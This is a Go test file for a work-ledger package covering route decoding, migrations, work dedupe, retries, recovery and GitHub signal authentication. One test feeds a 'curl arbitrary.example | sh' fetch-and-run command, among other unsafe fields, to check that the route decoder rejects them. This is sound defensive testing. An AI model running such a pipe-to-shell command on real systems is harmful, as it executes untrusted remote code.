package workledger

import (
	"context"
	"database/sql"
	"encoding/json"
	"path/filepath"
	"testing"
	"time"

	"github.com/grubbyhacker/signal-plane/internal/envelope"
)

type testExecutor struct{ descriptor ExecutorDescriptor }

func (executor testExecutor) Descriptor() ExecutorDescriptor { return executor.descriptor }
func (testExecutor) Execute(context.Context, ExecutorRequest) (ExecutorResult, error) {
	return ExecutorResult{Outcome: OutcomeCompleted}, nil
}

func TestRegistryAndRouteDecoderRejectUnboundedExecution(t *testing.T) {
	registry := NewRegistry()
	executor := testExecutor{descriptor: ExecutorDescriptor{ID: "github.pr-check", Kind: ExecutorDeterministicTool, Version: "v1"}}
	if err := registry.Register(executor); err != nil {
		t.Fatal(err)
	}
	if _, err := registry.Resolve("shell"); err == nil {
		t.Fatal("unregistered arbitrary executor was accepted")
	}
	route := testRoute()
	encoded, err := json.Marshal(route)
	if err != nil {
		t.Fatal(err)
	}
	var raw map[string]any
	if err := json.Unmarshal(encoded, &raw); err != nil {
		t.Fatal(err)
	}
	for field, value := range map[string]string{"command": "curl arbitrary.example | sh", "url": "https://arbitrary.example", "image": "untrusted:latest", "authority": "merge"} {
		raw[field] = value
		unsafe, _ := json.Marshal(raw)
		if _, err := DecodeRouteDefinition(unsafe); err == nil {
			t.Fatalf("route accepted arbitrary %s field", field)
		}
		delete(raw, field)
	}
}

func TestMigrationRollsBackAndFutureSchemaFailsClosed(t *testing.T) {
	ctx := context.Background()
	path := filepath.Join(t.TempDir(), "migration.db")
	db, err := sql.Open("sqlite", path)
	if err != nil {
		t.Fatal(err)
	}
	if _, err := db.Exec(`CREATE TABLE route_snapshots(id TEXT PRIMARY KEY); PRAGMA user_version=2`); err != nil {
		t.Fatal(err)
	}
	if err := Migrate(ctx, db); err == nil {
		t.Fatal("invalid v2 schema unexpectedly migrated")
	}
	var workItems, version int
	if err := db.QueryRow(`SELECT count(*) FROM sqlite_master WHERE type='table' AND name='work_items'`).Scan(&workItems); err != nil {
		t.Fatal(err)
	}
	if err := db.QueryRow(`PRAGMA user_version`).Scan(&version); err != nil {
		t.Fatal(err)
	}
	if workItems != 0 || version != 2 {
		t.Fatalf("failed migration was not atomic: work_items=%d version=%d", workItems, version)
	}
	if err := db.Close(); err != nil {
		t.Fatal(err)
	}
	futurePath := filepath.Join(t.TempDir(), "future.db")
	future, err := sql.Open("sqlite", futurePath)
	if err != nil {
		t.Fatal(err)
	}
	if _, err := future.Exec(`PRAGMA user_version=4`); err != nil {
		t.Fatal(err)
	}
	if err := future.Close(); err != nil {
		t.Fatal(err)
	}
	if store, err := Open(futurePath); err == nil {
		store.Close()
		t.Fatal("future schema version was accepted")
	}
}

func TestLedgerAdmissionDedupeSerializationSupersessionRetryAndRecovery(t *testing.T) {
	ctx := context.Background()
	store, err := Open(filepath.Join(t.TempDir(), "ledger.db"))
	if err != nil {
		t.Fatal(err)
	}
	defer store.Close()
	now := time.Date(2026, 7, 14, 12, 0, 0, 0, time.UTC)
	route := testRoute()
	registry := NewRegistry()
	if err := registry.Register(testExecutor{descriptor: ExecutorDescriptor{ID: route.ExecutorID, Kind: ExecutorDeterministicTool, Version: "v1"}}); err != nil {
		t.Fatal(err)
	}
	snapshot, err := store.ActivateRoute(ctx, route, registry, now)
	if err != nil {
		t.Fatal(err)
	}
	firstEvent := testEvent("delivery-1", 1, "rev-1")
	first, err := store.Admit(ctx, snapshot.ID, firstEvent, now)
	if err != nil {
		t.Fatal(err)
	}
	duplicate, err := store.Admit(ctx, snapshot.ID, firstEvent, now.Add(time.Second))
	if err != nil || !duplicate.Duplicate || duplicate.WorkItem.ID != first.WorkItem.ID {
		t.Fatalf("duplicate admission = %#v, %v", duplicate, err)
	}
	mutated := firstEvent
	mutated.PayloadDigest = "sha256:different"
	if _, err := store.Admit(ctx, snapshot.ID, mutated, now.Add(time.Second)); err == nil {
		t.Fatal("mutated replay with reused delivery id was accepted")
	}
	second, err := store.Admit(ctx, snapshot.ID, testEvent("delivery-2", 2, "rev-2"), now.Add(2*time.Second))
	if err != nil {
		t.Fatal(err)
	}
	var state WorkState
	var successor string
	if err := store.db.QueryRow(`SELECT state,superseded_by_id FROM work_items WHERE id=?`, first.WorkItem.ID).Scan(&state, &successor); err != nil {
		t.Fatal(err)
	}
	if state != StateSuperseded || successor != second.WorkItem.ID {
		t.Fatalf("old work = %s superseded by %q", state, successor)
	}
	item, attempt, ok, err := store.Claim(ctx, now.Add(3*time.Second))
	if err != nil || !ok || item.ID != second.WorkItem.ID || attempt.AttemptNumber != 1 {
		t.Fatalf("claim = %#v %#v %v %v", item, attempt, ok, err)
	}
	if _, _, claimed, err := store.Claim(ctx, now.Add(3*time.Second)); err != nil || claimed {
		t.Fatalf("serialization allowed parallel claim: %v %v", claimed, err)
	}
	if err := store.Complete(ctx, attempt.ID, ExecutorResult{Outcome: OutcomeRetryableFailure, RetryClassification: "transient"}, now.Add(4*time.Second)); err != nil {
		t.Fatal(err)
	}
	if _, _, claimed, err := store.Claim(ctx, now.Add(10*time.Second)); err != nil || claimed {
		t.Fatalf("retry ran before snapshotted backoff: %v %v", claimed, err)
	}
	_, retry, claimed, err := store.Claim(ctx, now.Add(35*time.Second))
	if err != nil || !claimed || retry.AttemptNumber != 2 {
		t.Fatalf("retry claim = %#v %v %v", retry, claimed, err)
	}
	recovered, err := store.RecoverInterrupted(ctx, now.Add(36*time.Second))
	if err != nil || recovered != 1 {
		t.Fatalf("recover = %d, %v", recovered, err)
	}
	_, recoveredAttempt, claimed, err := store.Claim(ctx, now.Add(37*time.Second))
	if err != nil || !claimed || recoveredAttempt.ID != retry.ID || recoveredAttempt.IdempotencyKey != retry.IdempotencyKey || recoveredAttempt.AttemptNumber != 2 {
		t.Fatalf("recovered claim = %#v %v %v", recoveredAttempt, claimed, err)
	}
	if err := store.Complete(ctx, recoveredAttempt.ID, ExecutorResult{Outcome: OutcomeCompleted, ExternalCorrelation: "github-check-42"}, now.Add(38*time.Second)); err != nil {
		t.Fatal(err)
	}
	if err := store.db.QueryRow(`SELECT state FROM work_items WHERE id=?`, second.WorkItem.ID).Scan(&state); err != nil || state != StateCompleted {
		t.Fatalf("completed state = %q, %v", state, err)
	}
}

func TestRouteVersionCreatesNewWorkAndWaitingRequiresWakeup(t *testing.T) {
	ctx := context.Background()
	store, err := Open(filepath.Join(t.TempDir(), "ledger.db"))
	if err != nil {
		t.Fatal(err)
	}
	defer store.Close()
	now := time.Date(2026, 7, 14, 12, 0, 0, 0, time.UTC)
	route := testRoute()
	registryV1 := NewRegistry()
	if err := registryV1.Register(testExecutor{descriptor: ExecutorDescriptor{ID: route.ExecutorID, Kind: ExecutorDeterministicTool, Version: "v1"}}); err != nil {
		t.Fatal(err)
	}
	snapshotV1, err := store.ActivateRoute(ctx, route, registryV1, now)
	if err != nil {
		t.Fatal(err)
	}
	repeatedV1, err := store.ActivateRoute(ctx, route, registryV1, now.Add(time.Second))
	if err != nil || repeatedV1.ID != snapshotV1.ID {
		t.Fatalf("identical activation was not idempotent: %#v %v", repeatedV1, err)
	}
	first, err := store.Admit(ctx, snapshotV1.ID, testEvent("delivery-v1", 1, "same-revision"), now)
	if err != nil {
		t.Fatal(err)
	}
	registryV2 := NewRegistry()
	if err := registryV2.Register(testExecutor{descriptor: ExecutorDescriptor{ID: route.ExecutorID, Kind: ExecutorDeterministicTool, Version: "v2"}}); err != nil {
		t.Fatal(err)
	}
	snapshotV2, err := store.ActivateRoute(ctx, route, registryV2, now.Add(time.Second))
	if err != nil {
		t.Fatal(err)
	}
	second, err := store.Admit(ctx, snapshotV2.ID, testEvent("delivery-v2", 2, "same-revision"), now.Add(2*time.Second))
	if err != nil {
		t.Fatal(err)
	}
	if first.WorkItem.ID == second.WorkItem.ID || second.WorkItem.RouteSnapshotID != snapshotV2.ID {
		t.Fatalf("route upgrade reused old work: first=%#v second=%#v", first.WorkItem, second.WorkItem)
	}
	item, attempt, claimed, err := store.Claim(ctx, now.Add(3*time.Second))
	if err != nil || !claimed || item.ID != second.WorkItem.ID {
		t.Fatalf("claim = %#v %#v %v %v", item, attempt, claimed, err)
	}
	if err := store.Complete(ctx, attempt.ID, ExecutorResult{Outcome: OutcomeWaiting}, now.Add(4*time.Second)); err != nil {
		t.Fatal(err)
	}
	if _, _, claimed, err := store.Claim(ctx, now.Add(24*time.Hour)); err != nil || claimed {
		t.Fatalf("externally waiting work became due without wakeup: %v %v", claimed, err)
	}
	if err := store.WakeWaiting(ctx, item.ID, now.Add(24*time.Hour)); err != nil {
		t.Fatal(err)
	}
	if _, _, claimed, err := store.Claim(ctx, now.Add(24*time.Hour)); err != nil || !claimed {
		t.Fatalf("woken work was not claimable: %v %v", claimed, err)
	}
}

func TestGitHubAdapterRequiresAuthenticationAndPreservesCausality(t *testing.T) {
	now := time.Now().UTC()
	signal := envelope.Signal{Meta: envelope.Meta{SignalID: "signal-1", Source: "github", SourceEvent: "pull_request", SourceAction: "synchronize", SourceDeliveryID: "delivery-1", Namespace: "example/widgets", ObjectKind: "pull_request", ObjectID: "17", SourceRevision: "abc123", CorrelationID: "correlation-1", CausationID: "cause-1", RootWorkItemID: "root-1", ParentWorkItemID: "parent-1", HopCount: 2, ReceivedAt: now}, Payload: json.RawMessage(`{"action":"synchronize"}`)}
	adapter := GitHubAdapter{}
	if _, err := adapter.Normalize(signal, "signals", 1); err == nil {
		t.Fatal("unauthenticated envelope was normalized")
	}
	signal.Meta.Authentication = envelope.Authentication{Method: "github_hmac_sha256", Verified: true}
	event, err := adapter.Normalize(signal, "signals", 1)
	if err != nil {
		t.Fatal(err)
	}
	if event.Namespace != "example/widgets" || event.SourceRevision != "abc123" || event.CausationID != "cause-1" || event.ParentWorkItemID != "parent-1" || event.HopCount != 2 || event.PayloadDigest == "" || event.EvidenceRef != "jetstream://signals/1" {
		t.Fatalf("normalized event lost identity or causality: %#v", event)
	}
}

func testRoute() RouteDefinition {
	return RouteDefinition{ID: "github-pr-check", SchemaVersion: 1, SemanticVersion: "1.0.0", ExecutorID: "github.pr-check", Admission: AdmissionPolicy{Sources: []string{"github"}, Namespaces: []string{"example/widgets"}, ObjectKinds: []string{"pull_request"}, Events: []string{"pull_request"}, Actions: []string{"synchronize"}}, Concurrency: ConcurrencyPolicy{Serialization: SerializeObject, Supersede: true}, Retry: RetryPolicy{MaxAttempts: 3, Backoff: []time.Duration{30 * time.Second, time.Minute}}}
}

func testEvent(delivery string, sequence uint64, revision string) Event {
	return Event{SignalID: "signal-" + delivery, SourceDeliveryID: delivery, TransportStream: "signals", TransportSequence: sequence, Source: "github", Namespace: "example/widgets", ObjectKind: "pull_request", ObjectID: "17", EventKind: "pull_request", Action: "synchronize", ActorClass: "user", SourceRevision: revision, CorrelationID: "correlation-1", CausationID: "cause-1", PayloadDigest: "sha256:payload", EvidenceRef: "nats://signals", ReceivedAt: time.Date(2026, 7, 14, 12, 0, 0, 0, time.UTC)}
}
